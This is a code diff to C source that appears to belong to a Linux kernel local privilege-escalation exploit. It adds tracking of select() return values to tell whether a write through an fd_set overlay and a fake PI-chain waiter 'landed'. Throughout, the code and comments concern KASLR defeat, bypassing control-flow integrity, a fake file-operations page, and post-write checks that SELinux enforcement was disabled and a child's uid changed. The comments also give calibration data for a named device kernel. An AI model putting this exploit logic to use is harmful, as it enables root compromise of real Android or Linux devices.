@@ -9,7 +9,7 @@ static double fops_elapsed_ms(struct timespec *ref) {
 extern int pselect_custom_write;
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
-#define PSELECT_EXPECTED_READY 9
+/* PSELECT_EXPECTED_READY comes from common.h — main.c reports it too. */
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -24,6 +24,19 @@ int pipe_stage_attempts;
 int cfi_dirty_seen;
 int cfi_last_step;
 int cfi_last_errno;
+/* select()'s return value and the consumer counters for the most recent route
+ * attempt. These are the only observable signal that the fd_set/waiter overlay
+ * actually landed: ret==PSELECT_EXPECTED_READY means the kernel mutated the
+ * caller's fd_set (i.e. the PI walk reached our fake waiter), while ret==3 means
+ * the overlay missed and any write made in that attempt was dropped. Callers
+ * used to see only "cfi_last_step==0 / route_verified==1" on the custom-write
+ * path, which reports success regardless of ret, so main.c could not tell a
+ * landed write from a dud. */
+int route_last_ret;
+int route_last_errno;
+int route_last_calls;
+int route_last_success;
+int route_last_loops;
 int kaslr_done;
 int kaslr_step;
 uint64_t kaslr_fops_alias;
@@ -212,6 +225,11 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int route_verified = 0;
+  route_last_ret = -1;
+  route_last_errno = 0;
+  route_last_calls = 0;
+  route_last_success = 0;
+  route_last_loops = 0;
   for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
        route_attempt++) {
     if (route_attempt != 1) {
@@ -297,6 +315,11 @@ void do_pselect_fake_lock_route(void) {
 
     int route_quality_miss = 0;
     int route_signal = calls > 0 && success > 0;
+    route_last_ret = ret;
+    route_last_errno = saved_errno;
+    route_last_calls = calls;
+    route_last_success = success;
+    route_last_loops++;
     int cfi_probed = 0;
     if (route_signal) {
       cfi_probed = 1;
@@ -349,9 +372,29 @@ void do_pselect_fake_lock_route(void) {
     pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
             route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
   }
-  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
-          calls, success, cfi_last_step, cfi_last_errno);
+  pr_info("pselect route done calls=%d success=%d step=%d errno=%d "
+          "ret=%d loops=%d\n",
+          calls, success, cfi_last_step, cfi_last_errno,
+          route_last_ret, route_last_loops);
 }
+
+/* A write only lands when the PI walk reached the fake waiter, which shows up in
+ * select()'s return value: the kernel writes the ready set back into the
+ * caller's fd_set, so a larger count means more of the embedded descriptors were
+ * consumed by the punch.
+ *
+ * Calibrated on PLG110 (6.12.23): a miss returns 3, every landed write returned
+ * 4 or 5, and PSELECT_EXPECTED_READY(9) never occurred but is the value the route
+ * treats as nominal. So the test is "more than the three descriptors the route
+ * opens for itself", not equality with the nominal constant.
+ *
+ * This is a progress signal, not proof: the authoritative proof is the effect
+ * check after the write (selinux enforce for W1, child uid for W2). */
+#define PSELECT_MISS_RET_BASELINE 3
+int pselect_route_landed(void) {
+  return route_last_loops > 0 && route_last_ret > PSELECT_MISS_RET_BASELINE;
+}
+
 
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
